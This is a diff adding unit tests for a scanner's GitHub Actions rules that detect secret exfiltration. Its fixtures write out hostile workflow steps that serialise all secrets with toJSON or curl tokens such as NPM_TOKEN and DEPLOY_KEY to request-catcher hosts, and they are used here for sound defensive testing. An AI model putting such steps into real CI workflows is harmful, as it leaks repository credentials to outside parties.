@@ -980,3 +980,45 @@ describe('misconfiguration, weak crypto and injection', () => {
     expect(ruleIds('a.js', "res.setHeader('X-Name', sanitized);")).toEqual([]);
   });
 });
+
+describe('GitHub Actions secret exfiltration', () => {
+  const wf = (steps: string) =>
+    `name: ci\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n${steps}\n`;
+  const path = '.github/workflows/ci.yml';
+  const gha = (p: string, source: string) => ruleIds(p, source).filter((id) => id.startsWith('gha-'));
+
+  it('flags every secret serialised with toJSON(secrets)', () => {
+    const source = wf('      - run: echo "${{ toJSON(secrets) }}" | base64 > s.txt');
+    expect(gha(path, source)).toContain('gha-all-secrets-serialized');
+  });
+
+  it('flags a secret posted to a request catcher, inline or via env', () => {
+    const inline = wf('      - run: curl -s -d "t=${{ secrets.NPM_TOKEN }}" https://webhook.site/0b6c1f2e');
+    expect(gha(path, inline)).toContain('gha-secret-to-collector');
+    const viaEnv = wf(
+      [
+        '      - name: sync',
+        '        env:',
+        '          T: ${{ secrets.DEPLOY_KEY }}',
+        '        run: curl -X POST -d "$T" https://abc123.oast.fun/',
+      ].join('\n'),
+    );
+    expect(gha(path, viaEnv)).toContain('gha-secret-to-collector');
+  });
+
+  it('stays silent on a secret sent to the API it belongs to', () => {
+    const source = wf(
+      '      - run: curl -H "Authorization: Bearer ${{ secrets.VERCEL_TOKEN }}" https://api.vercel.com/v6/deployments',
+    );
+    expect(gha(path, source)).toEqual([]);
+  });
+
+  it('stays silent on a request catcher with no secret in reach', () => {
+    const source = wf('      - run: curl -d "build=${{ github.sha }}" https://webhook.site/0b6c1f2e');
+    expect(gha(path, source)).toEqual([]);
+  });
+
+  it('only reads workflow files', () => {
+    expect(gha('config/notes.yml', 'docs: "never write toJSON(secrets) in a workflow"\n')).toEqual([]);
+  });
+});
